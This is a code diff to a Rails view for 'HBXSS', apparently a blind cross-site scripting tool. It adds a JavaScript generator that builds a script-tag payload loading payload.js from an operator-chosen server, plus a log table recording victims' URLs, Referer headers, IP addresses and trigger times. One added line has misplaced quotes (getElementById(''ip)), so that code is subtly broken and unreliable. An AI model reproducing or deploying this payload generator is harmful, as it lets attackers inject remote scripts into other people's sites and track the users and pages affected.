@@ -1,40 +1,45 @@
 <p id="notice"><%= notice %></p>
-
 <h1>HBXSS</h1>
 <hr>
-<h2>XSS Generate</h2>
-<table>
-<tr>
-  <td>PRI KEY</td>
-  <td colspan="2"><input id="" type=text value=""></td>
-</tr>
-<tr>
-  <td>SERVER IP</td>
-  <td><input id="" type=text value=""></td><td><input type=button value="load url"></td>
-</tr>
-<tr>
-  <td colspan="2"><input type="text" value="payload"></td><td><input type=button value="generte"</td>
-</tr>
-</table>
+<h2>XSS Payload</h2>
+<script>
+function gen()
+{
+ var pri = document.getElementById('pri');
+ var ip = document.getElementById('ip');
+ var payload = "<"+"script/id='hbxss' src='//"+ip.value+"/payload.js' class='"+pri.value+"'><"+"/script>";
+ document.getElementById('payload').value=payload;
+}
+</script>
+PRI KEY <input id="pri" type=text value="">
+SERVER DOMAIN <input id="ip" type=text value="">
+<input type=button value="GENERATE" onclick="gen()"><br>
+<input type="text" id="payload" value="" style="width=100%">
+<script>document.getElementById(''ip).value=document.location</script>
 <hr>
 
 <h2>Logs</h2>
+<input type="text" value="search">
 <table>
   <thead>
     <tr>
       <th>Key</th>
       <th>Url</th>
-      <th>Ip</th>
-      <th>Time</th>
+      <th>Referer Header</th>
+      <th>Target IP</th>
+      <th>Trigger Time</th>
       <th colspan="3"></th>
     </tr>
   </thead>
 
   <tbody>
-    <% @logs.each do |log| %>
+    <% 
+    @logs = @logs.sort.reverse
+    @logs.each do |log| %>
       <tr>
         <td><%= log.key %></td>
         <td><%= log.url %></td>
+        <td><%= log.referer %></td>
         <td><%= log.ip %></td>
         <td><%= log.time %></td>
         <td><%= link_to 'Show', log %></td>
